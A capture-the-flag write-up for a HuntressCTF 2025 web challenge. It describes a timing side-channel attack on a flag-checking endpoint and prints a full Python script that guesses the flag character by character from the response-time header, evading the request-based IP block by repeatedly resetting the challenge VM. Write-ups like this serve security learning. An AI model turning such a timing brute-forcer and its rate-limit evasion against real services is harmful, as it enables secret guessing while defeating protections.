---
title: HuntressCTF 2025 Flag Checker
draft: false
tags:
  - ctf
  - web-exploitation
---

# Flag Checker

> We've decided to make this challenge really straight forward. All you have to do is find out the flag! Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...

This challenge was solved improperly. However, I think the solve is funny, so I want to share it. Basically, it seems to be a timing attack based challenge. We can submit 11 attempts of checking the flag, and there is an `X-Response-Time` response header, which has the response time of the request. For example, if we do `flag=a`, it's very low. However, if we do `flag=flag{`, it's ~0.5s. So, we can slowly build the flag by trying different characters and seeing if the response time jumps. However, remember, there is an 11 request limit before we start getting "Your IP has been blocked" errors. We tried a few common bypasses such as `X-Forwarded-For`, `X-Client-IP`, `X-Original-IP`, and other headers, but nothing seemed to resolve it. I am assuming that is the core of the challenge: finding the proper bypass. However, what if we just... restarted the VM instance and did 11 more attempts? Rinse and repeat. So, that's what I did. I created a Python script to perform 10 character checks, reset the VM, perform 10 character checks, and repeat until we build the flag. We know that the flag format is `flag{<hex>}`, so our charset is limited to `abcdef0123456789{`, which means it takes 2 VM resets to guarantee one character. 

```python
import requests
import time
import random

RESET_VM_URL = "https://ctf.huntress.com/api/student/courses/a1610328-0e2c-4190-99ec-83f3e7ddff5a/systems/a30a3849-db00-48c6-9c35-c2ec37fa6cb3/reset"
RESET_VM_COOKIE_1 = "base64-..."
RESET_VM_COOKIE_2 = "Tk0L..."
BASE_URL = "http://10.1.78.225/submit"
KNOWN_FLAG = "flag{"
CHARSET = "abcdef1234567890}"
SESSION = requests.Session()
REQ_COUNT = 0
MAX_REQUESTS_BEFORE_RESET = 10  # Reset after 10 requests to stay safe (11 is the limit)

def get_new_ip():
    max_attempts = 60
    api_url = "https://ctf.huntress.com/api/student/courses/a1610328-0e2c-4190-99ec-83f3e7ddff5a/systems?courseSystemIds=%5B%2214b4395b-fd54-49bf-8f0f-74a9cd77f64d%22%2C%2233ca3ff7-07b2-4e40-813c-f74052291724%22%2C%224a427c14-dbdc-46a9-8266-919a6f32062f%22%2C%2254923429-45c1-4dee-9efa-593a22e14cdd%22%2C%228a58f01a-dc66-4232-af89-849401a3fbbf%22%2C%22a288131e-738d-483c-ab05-544aa470ff71%22%2C%22a30a3849-db00-48c6-9c35-c2ec37fa6cb3%22%2C%22e787f98f-5836-4178-b16b-cbcbdbadbc60%22%5D"
    
    for attempt in range(max_attempts):
        try:
            r = requests.get(api_url, cookies={"sb-auth-auth-token.0": RESET_VM_COOKIE_1, "sb-auth-auth-token.1": RESET_VM_COOKIE_2})
            systems = r.json()["systems"]
            
            for system in systems:
                if system["id"] == "a30a3849-db00-48c6-9c35-c2ec37fa6cb3":
                    system_data = system["system"]
                    state = system_data.get("state", "unknown")
                    
                    # Check if IP is available
                    if "ip" in system_data:
                        ip_address = system_data["ip"]
                        print(f"New IP address: {ip_address} (state: {state})")
                        global BASE_URL
                        BASE_URL = f"http://{ip_address}/submit"
                        return True
                    else:
                        print(f"Waiting for IP assignment... (state: {state}, attempt {attempt + 1}/{max_attempts})")
        except Exception as e:
            print(f"Error getting IP: {e} (attempt {attempt + 1}/{max_attempts})")
        
        time.sleep(1)
    
    print("Warning: Could not get IP address after 60 seconds")
    return False

def reset_vm():
    r = SESSION.post(RESET_VM_URL, cookies={"sb-auth-auth-token.0": RESET_VM_COOKIE_1, "sb-auth-auth-token.1": RESET_VM_COOKIE_2}, json={})
    if r.json()["success"] == True:
        print("VM reset successfully")
    else:
        print("VM reset failed")

def score_candidate(candidate):
    global REQ_COUNT
    r = SESSION.get(BASE_URL, params={"flag": candidate})
    resp_time = float(r.headers.get("X-Response-Time", "0"))
    REQ_COUNT += 1
    print(f"{candidate}: {resp_time:.6f}s [Request {REQ_COUNT}/{MAX_REQUESTS_BEFORE_RESET}]")
    return resp_time

def wait_for_vm_ready():
    """Poll the VM until it's actually ready to accept requests"""
    startup_message = "This page should disappear within about a minute once the service finishes starting."
    max_attempts = 60  # Try for up to 60 seconds
    
    for attempt in range(max_attempts):
        try:
            # Try to hit the endpoint with a short timeout
            r = SESSION.get(BASE_URL, timeout=1)
            # If we get a response and it doesn't have the startup message, we're good!
            if startup_message not in r.text:
                print(f"VM is ready! (took {attempt + 1} seconds)")
                return True
            else:
                print(f"VM still starting... ({attempt + 1}s)")
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            # Timeout or connection error means VM isn't ready yet
            print(f"VM not responding yet... ({attempt + 1}s)")
        
        time.sleep(1)
    
    print("Warning: VM may not be fully ready, but proceeding anyway after 60s")
    return False

def reset_and_wait():
    global REQ_COUNT
    print(f"\n[Rate limit approaching after {REQ_COUNT} requests] Resetting VM...")
    reset_vm()
    print("Getting new IP address...")
    get_new_ip()
    print("Waiting for VM to come back online...")
    wait_for_vm_ready()
    REQ_COUNT = 0  # Reset counter
    print("VM ready! Resuming...\n")

while KNOWN_FLAG[-1] != "}":
    best_time = 0  # Start at 0 to find MAXIMUM time
    best_char = None
    results = {}
    
    print(f"\n{'='*60}")
    print(f"Testing position {len(KNOWN_FLAG)} (current flag: {KNOWN_FLAG})")
    print(f"{'='*60}\n")
    
    # Test each character in CHARSET
    for idx, c in enumerate(CHARSET):
        # Check if we need to reset BEFORE making the request
        if REQ_COUNT >= MAX_REQUESTS_BEFORE_RESET:
            reset_and_wait()
        
        # Make the request
        t = score_candidate(KNOWN_FLAG + c)
        results[c] = t
        if t > best_time:  # Find HIGHEST time (correct char takes longer)
            best_time = t
            best_char = c
    
    # Show all results for this character position
    print(f"\n{'='*60}")
    print(f"Results for position {len(KNOWN_FLAG)} (sorted by response time):")
    print(f"{'='*60}")
    for c, t in sorted(results.items(), key=lambda x: x[1], reverse=True):  # Sort descending
        marker = " <-- BEST (SLOWEST)" if c == best_char else ""
        print(f"  '{c}': {t:.6f}s{marker}")
    
    KNOWN_FLAG += best_char
    print(f"\n{'='*60}")
    print(f"[CURRENT KNOWN_FLAG] {KNOWN_FLAG}")
    print(f"{'='*60}\n")
```

Again, definitely not the intended solution, but I found it a fun solve nonetheless. Any challenge that involves web automation is a good challenge :)